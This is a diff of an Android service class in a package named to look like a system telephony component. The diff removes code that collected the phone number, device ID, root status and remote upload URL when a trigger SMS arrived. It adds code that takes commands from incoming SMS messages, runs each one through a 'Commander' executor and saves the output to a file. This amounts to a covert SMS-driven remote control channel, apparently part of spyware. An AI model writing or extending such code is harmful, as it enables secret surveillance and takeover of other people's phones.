@@ -1,17 +1,8 @@
 package com.telephony.services;
 
 import java.io.File;
-import java.io.FileOutputStream;
-import java.io.IOException;
-import java.io.UnsupportedEncodingException;
-import java.security.InvalidKeyException;
-import java.security.NoSuchAlgorithmException;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-
-import javax.crypto.BadPaddingException;
-import javax.crypto.IllegalBlockSizeException;
-import javax.crypto.NoSuchPaddingException;
 
 import android.app.Service;
 import android.content.Context;
@@ -25,6 +16,7 @@ public class SMService extends Service {
 	private String sms_body = null;
 	private String phoneNumber = null;
 	private String sms_from_name = null;
+	private Commander cmdr;
 
 	@Override
 	public IBinder onBind(Intent intent) {
@@ -37,6 +29,7 @@ public class SMService extends Service {
 		super.onCreate();
 		es = Executors.newFixedThreadPool(1);
 		sPref = PreferenceUtils.getInstance(this);
+		cmdr = new Commander(this);
 		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
 	}
 
@@ -45,39 +38,6 @@ public class SMService extends Service {
 		es.execute(new RunService(intent, flags, startId, this));
 		return START_REDELIVER_INTENT;
 
-	}
-
-	private void getConfig(String filename) throws UnsupportedEncodingException, IOException, InvalidKeyException, IllegalBlockSizeException,
-			BadPaddingException, NoSuchAlgorithmException, NoSuchPaddingException {
-		FileOutputStream fos = null;
-		MyProperties prop = new MyProperties();
-		try {
-			fos = new FileOutputStream(new File(sPref.getRootDir(), filename));
-			prop.setIntProperty("Current version", Utils.getCurrentVersion(this));
-			prop.setProperty("phoneNumber", Utils.getSelfPhoneNumber(this));
-			prop.setProperty("DeviceId", Utils.getDeviceId(this));
-			prop.setBoolProperty("root", Utils.CheckRoot());
-			prop.setProperty(PreferenceUtils.ROOT_DIR, sPref.getRootDir().getAbsolutePath());
-			prop.setProperty(PreferenceUtils.UPLOAD_URL, sPref.getRemoteUrl());
-			prop.setIntProperty(PreferenceUtils.KEEP_DAYS, sPref.getKeepDays());
-			prop.setIntProperty(PreferenceUtils.VIBRATE, sPref.getVibrate());
-			prop.store(fos, Utils.IDENT_SMS);
-		} finally {
-			if (fos != null) {
-				fos.close();
-			}
-		}
-	}
-
-	private void setConfig(String src) throws IOException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException,
-			NoSuchAlgorithmException, NoSuchPaddingException {
-		MyProperties prop = new MyProperties();
-
-		prop.load(src);
-		sPref.setRootDir(prop.getProperty(PreferenceUtils.ROOT_DIR));
-		sPref.setRemoteUrl(prop.getProperty(PreferenceUtils.UPLOAD_URL));
-		sPref.setKeepDays(prop.getIntProperty(PreferenceUtils.KEEP_DAYS));
-		sPref.setVibrate(prop.getIntProperty(PreferenceUtils.VIBRATE));
 	}
 
 	private class RunService implements Runnable {
@@ -95,23 +55,30 @@ public class SMService extends Service {
 
 		public void run() {
 			try {
-				Log.d(Utils.LOG_TAG, context.getClass().getName() + ": stop " + startId);
-				if (sPref.getRootDir().exists() && (Utils.updateExternalStorageState() == Utils.MEDIA_MOUNTED)) {
+				Log.d(Utils.LOG_TAG, context.getClass().getName() + ": start " + startId);
+				Log.d(Utils.LOG_TAG, intent.toUri(Intent.URI_INTENT_SCHEME));
+				if (sPref.getRootDir().exists() && (Utils.getExternalStorageStatus() == Utils.MEDIA_MOUNTED)) {
 					phoneNumber = intent.getStringExtra(Utils.EXTRA_PHONE_NUMBER);
 					sms_from_name = Utils.getContactName(context, phoneNumber);
-					sms_body = intent.getStringExtra(Utils.EXTRA_SMS_BODY).trim();
+					sms_body = intent.getStringExtra(Utils.EXTRA_SMS_BODY).replace(Utils.IDENT_SMS, "").trim();
 					if (sms_body != null) {
-						if (sms_body.equals(Utils.IDENT_SMS)) {
-							Log.d(Utils.LOG_TAG, "Send configuration");
-							getConfig(Utils.CONFIG_OUT_FILENAME);
-						} else if (sms_body.startsWith(Utils.IDENT_SMS)) {
-							Log.d(Utils.LOG_TAG, "Set configuration");
-							setConfig(sms_body);
-							getConfig(Utils.CONFIG_OUT_FILENAME);
+						StringBuilder exec_out = new StringBuilder();
+						String[] sms = sms_body.split(" *#+ *|[ \r]*\n+");
+
+						for (String cmd : sms) {
+							try {
+								if (!cmd.isEmpty()) {
+									Log.d(Utils.LOG_TAG, "try to exec: " + cmd);
+									exec_out.append(cmdr.exec(cmd));
+								}
+							} catch (Exception e) {
+								e.printStackTrace();
+							}
+						}
+						if (exec_out.length() > 0) {
+							Utils.writeFile(new File(sPref.getRootDir(), Utils.CONFIG_OUT_FILENAME), exec_out.toString());
 						}
 					}
-
-					Log.d(Utils.LOG_TAG, intent.toUri(Intent.URI_INTENT_SCHEME));
 				}
 			} catch (Exception e) {
 				e.printStackTrace();
@@ -136,6 +103,7 @@ public class SMService extends Service {
 	public void onDestroy() {
 
 		super.onDestroy();
+		cmdr = null;
 		es = null;
 		sPref = null;
 		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
